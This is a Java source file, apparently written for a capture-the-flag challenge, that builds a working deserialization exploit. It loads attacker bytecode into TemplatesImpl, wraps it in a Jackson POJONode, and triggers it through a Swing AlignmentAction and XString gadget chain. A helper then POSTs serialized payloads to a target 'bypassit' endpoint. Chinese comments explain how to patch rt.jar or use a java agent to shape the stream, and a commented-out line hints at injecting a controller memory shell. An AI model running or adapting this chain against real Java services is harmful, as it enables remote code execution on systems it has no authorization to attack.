package jackson;

import com.alibaba.fastjson.JSONArray;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.EventListenerList;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.sql.SQLOutput;
import java.util.Base64;
import java.util.Vector;

/*
 *  方法一
 *  我们需要修改本地jdk的rt.jar包中的javax.swing.ArrayTable的writeArrayTable方法为
      static void writeArrayTable(ObjectOutputStream var0, ArrayTable var1) throws IOException {
        if (var1 != null && var1.getKeys((Object[])null) != null) {
            boolean var2 = false;
            var0.writeInt(3);
            var0.writeObject(var1.get("test"));
            var0.writeObject("111");
            var0.writeObject("11");
            var0.writeObject(var1.get("11"));
            var0.writeObject("11");
            var0.writeObject(var1.get("12"));
        } else {
            var0.writeInt(0);
        }

    }


 * 方法二
 * 这里的话我们使用Boogipop大佬的AbstractActionAgent.jar作为agent即可，就不用那么麻烦地还要改源码啦
 */



public class Test {
    public static void main(String[] args) throws Exception {

        Templates templatesimpl = new TemplatesImpl();

        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));
//        byte[] bytecodes = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\jackson\\InjectToController.class"));

        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

//        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
//        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
//        cons.setAccessible(true);
//        AdvisedSupport advisedSupport = new AdvisedSupport();
//        advisedSupport.setTarget(templatesImpl);
//        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
//        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
//
//
        POJONode jsonNodes = new POJONode(templatesimpl);



        XString xString = new XString("111");

        SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport("11");
        StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction("111",1);

        Field field = Class.forName("javax.swing.AbstractAction").getDeclaredField("changeSupport");
        field.setAccessible(true);
        field.set(alignmentAction,swingPropertyChangeSupport);

        alignmentAction.putValue("test","test");
        alignmentAction.putValue("11",xString);
        alignmentAction.putValue("12",jsonNodes);



        deserial(serial(alignmentAction));

    }
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
    //jdk1.8-13触发toString的链（17不行
    public static Object makeReadObjectToStringTrigger(Object obj) throws Exception {
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager, "edits");
        vector.add(obj);
        setValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }

    public static String serial(Object o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void doPOST(byte[] obj) throws Exception{
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set("Content-Type", "text/plain");
//        URI url = new URI("http://neepusec.fun:27010/nomap");
        URI url = new URI("http://192.168.113.134:8080/bypassit");
        //URI url = new URI("http://localhost:8080/bypassit");
        HttpEntity<byte[]> requestEntity = new HttpEntity <> (obj,requestHeaders);

        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
        System.out.println(res.getBody());
    }

}
